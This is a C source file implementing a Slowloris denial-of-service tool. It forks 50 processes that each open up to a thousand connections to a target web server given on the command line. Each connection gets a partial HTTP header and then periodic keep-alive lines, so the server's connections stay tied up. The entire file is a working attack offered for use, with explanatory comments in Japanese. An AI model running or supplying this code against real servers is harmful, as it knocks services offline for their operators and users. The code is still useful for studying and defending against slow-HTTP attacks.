/***** main.c *****
* Author : flekystyley
* Date   : 31.1.2019
* Brief  : entry point
**************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>

#include <signal.h>

#include "args_parser.h"

#define UNUSED(expr) do { (void)(expr); } while (0)

typedef int SOCKET;
typedef struct sockaddr_in SOCKADDR_IN;
typedef struct sockaddr SOCKADDR;

char header[1024] = "GET /toto HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0 .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n";
char keep_alive[16] = "X-a: b\r\n";
char target[1024] = "";
int port = 80;
int timeout = 10;
int fork_nbr = 50;
int con_nbr = 1000;
int test = 0; // used as boolean
int duration = 600;
int nbr_test = 50; 

int slowloris(Arguments *args) 
{
    SOCKADDR_IN serveraddr = { 0 };
    int sock[con_nbr];
    int pids[con_nbr];
    // sockをsockの配列分0で埋める
    // sizeof(sock) == sizeof(int) * con_nbr;
    memset(sock, -1, sizeof(sock));

    // serveraddrの先頭アドレスから、serveraddr分0で埋める
    bzero(&serveraddr, sizeof(serveraddr));
    serveraddr.sin_family = AF_INET;
    // inet_addrはIPアドレスを32bitのバイナリ値に変換する
    // 実装部はこんな感じtypedef __uint32_t      in_addr_t;      /* base type for internet address */}
    serveraddr.sin_addr.s_addr = inet_addr(args->target_host);
    serveraddr.sin_port = htons(args->target_port);

    // 50個、子プロセスを作成して、コネクションをできるだけ長く接続しておく
    for(int i = 0; i<fork_nbr; i++) {
        // 子プロセスを作成する
        int pid = fork();
        if(pid == 0) {
            while(1) {
                // create connection
                for(int j = 0; j<con_nbr; j++) {
                    // failed to create socket
                    if((sock[j] = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                        perror("socket()");
                        printf("Socket %d: failed to create socket\n", i);
                        exit(0);
                    }
                    
                    // connect
                    if(connect(sock[j], (SOCKADDR *)&serveraddr, sizeof(serveraddr))  == -1) {
                        // failed to connect
                        perror("connect()");
                        exit(0);
                    } else {
                        // succeded to connect
                        printf("Socket %d: connected to server\n", i);
                    }

                    // send header
                    if(send(sock[j], header, strlen(header), 0) < 0) {
                        perror("error");
                        exit(0);
                    } else {
                        printf("Socket %d: header send\n", i);
                    }
                }

                // send keep alive
                for(int j = 0; j<con_nbr; j++) {
                    if(send(sock[j], keep_alive, strlen(keep_alive), 0) < 0) {
                        exit(0);
                    } else {
                        printf("Socket %d: keep alive send\n", i);
                    }
                }
            }

            sleep(timeout);

        } else {
            pids[i] = pid;
        }
    }

    sleep(duration);
    for(int i = 0; i < con_nbr; i++){
	    kill (pids[i], SIGKILL);
    }

    return 0;
}


int main(int argc, char const *argv[])
{ 
    UNUSED(argc);
    UNUSED(argv);
    Arguments args;
    init_args(&args);
    parse(argc, argv, &args);
    slowloris(&args);
    return 0;
}
